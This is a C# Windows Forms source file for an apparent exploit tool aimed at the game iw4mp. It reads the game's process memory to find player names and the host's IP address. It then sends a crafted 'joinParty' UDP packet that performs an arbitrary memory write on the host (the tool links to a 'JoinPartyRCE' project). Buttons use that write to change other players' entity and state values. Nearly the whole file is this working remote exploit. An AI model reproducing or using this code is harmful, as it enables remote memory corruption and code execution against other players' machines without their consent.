using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Net;
using System.Threading;
using System.Net.Sockets;

namespace Blasts_Test
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        [DllImport("kernel32.dll")]
        public static extern bool ReadProcessMemory(int hProcess, UInt32 lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);

        private byte[] GetBytes(string ModuleName, UInt32 Address, int Length)
        {
            byte[] buffer = new byte[Length];

            foreach (Process mod in Process.GetProcesses())
            {
                if (mod.ProcessName == ModuleName)
                {
                    ReadProcessMemory((int)mod.Handle, Address, buffer, Length, ref Length);
                }
            }

            return buffer;
        }

        public byte[] ReadBytes(string ModuleName, UInt32 offset, int length)
        {
            byte[] buffer = GetBytes(ModuleName, offset, length);
            return buffer;
        }

        public string ReadString(string ModuleName, int offset)
        {
            int blocksize = 40;
            int scalesize = 0;
            string str = string.Empty;

            while (!str.Contains('\0'))
            {
                byte[] buffer = ReadBytes(ModuleName, (uint)offset + (uint)scalesize, blocksize);
                str += Encoding.UTF8.GetString(buffer);
                scalesize += blocksize;
            }

            return str.Substring(0, str.IndexOf('\0'));
        }

        public uint getPlayerstate(uint client)
        {
            return 0x01B0E1C0 + (client * 0x366C);
        }

        public uint getEntity(uint client)
        {
            return 0x0194B9D0 + (client * 0x274);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            listBox1.Items.Clear();
            for (int i = 0; i < 18; i++)
            {
                listBox1.Items.Add(ReadString("iw4mp", 0x10F9362 + (0xE0 * i)));
            }
        }

        private void Send(string IP, ushort Port, byte[] Data)
        {
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

            IPAddress serverAddr = IPAddress.Parse(IP);

            IPEndPoint endPoint = new IPEndPoint(serverAddr, Port);

            sock.SendTo(Data, endPoint);

            sock.Close();
        }

        public static string ConvertIP(byte[] input, string spacer)
        {
            string str = string.Empty;
            for (int i = 0; i < 4; ++i)
            {
                Decimal num = Convert.ToDecimal(input[i]);
                str = i == 3 ? str + Convert.ToString(num) : str + Convert.ToString(num) + spacer;
            }
            return str;
        }

        public void WriteUInt(uint Address, uint Value)
        {
            string exp = "ÿÿÿÿ1joinParty 149 1 1 0 0 0 32 0 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 4273664 28882928 6706537 0 4198910 4273664 " + (uint)(Address - 0x14) + " 6706537 " + (uint)Value + " 4198910 5677570";

            byte[] HostIP = ReadBytes("iw4mp", 0xAF6028, 4); //Grab Host's IP from NetChan
            string HostIPString = ConvertIP(HostIP, "."); //Convert IP to string and format it correctly

            byte[] Packet = Encoding.ASCII.GetBytes(exp); //Convert string to byte array

            Buffer.BlockCopy(BitConverter.GetBytes(0xFFFFFFFF), 0, Packet, 0, 4); //Overwrite first 4 bytes to specify connectionless packet, idk why but ascii conversion fails

            //Send Packet
            Send(HostIPString, 28960, Packet);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            uint SelectedClient = (uint)listBox1.SelectedIndex;
            WriteUInt(getEntity(SelectedClient) + 0x184, 1);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            uint SelectedClient = (uint)listBox1.SelectedIndex;
            WriteUInt(getEntity(SelectedClient) + 0x184, 0);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            uint SelectedClient = (uint)listBox1.SelectedIndex;
            WriteUInt(getPlayerstate(SelectedClient) + 0x3394, 1);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            uint SelectedClient = (uint)listBox1.SelectedIndex;
            WriteUInt(getPlayerstate(SelectedClient) + 0x3394, 0);
        }

        private void button6_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://github.com/BlastsMods/JoinPartyRCE");
        }
    }
}
